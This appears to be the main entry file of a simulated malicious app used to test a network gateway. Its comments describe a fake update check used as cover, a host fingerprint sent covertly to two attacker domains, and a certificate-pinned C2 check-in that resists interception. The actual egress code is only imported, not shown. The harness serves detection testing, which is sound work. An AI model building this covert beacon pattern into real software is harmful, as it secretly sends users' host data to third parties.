import { loadConfig } from "./config.js";
import { sendBeacon } from "./egress/beacon.js";
import { pinnedCheckin } from "./egress/pinned.js";
import { checkForUpdate } from "./egress/updateCheck.js";
import { buildFingerprint } from "./fingerprint.js";
import { createLogger, installGlobalErrorHandlers } from "./logger.js";

const logger = createLogger({ appName: "suspect-app" });
installGlobalErrorHandlers(logger);

// The "freshly downloaded app". Four steps, in order:
//   1. a legitimate update check (the cover story)     -> egress/updateCheck.ts
//   2. build a host fingerprint (fake, see SAFETY)     -> fingerprint.ts
//   3. covertly POST it to two attacker domains        -> egress/beacon.ts
//   4. a certificate-pinned C2 check-in that refuses
//      to talk through any interceptor                 -> egress/pinned.ts
// Steps 2-4 are the suspicious behaviour the gateway is meant to expose.
async function main(): Promise<void> {
  const cfg = loadConfig(process.env);
  const fingerprint = buildFingerprint();

  await checkForUpdate(cfg, logger);
  for (const url of cfg.beaconUrls) {
    await sendBeacon(url, fingerprint, logger);
  }
  await pinnedCheckin(cfg, logger);

  // Let the gateway flush its capture before we exit and the stack tears down.
  logger.info({ settleMs: cfg.settleMs }, "Settling before exit...");
  await new Promise((r) => setTimeout(r, cfg.settleMs));
}

main().then(
  () => process.exit(0),
  (err) => {
    logger.error({ err }, "suspect-app run failed.");
    process.exit(1);
  },
);
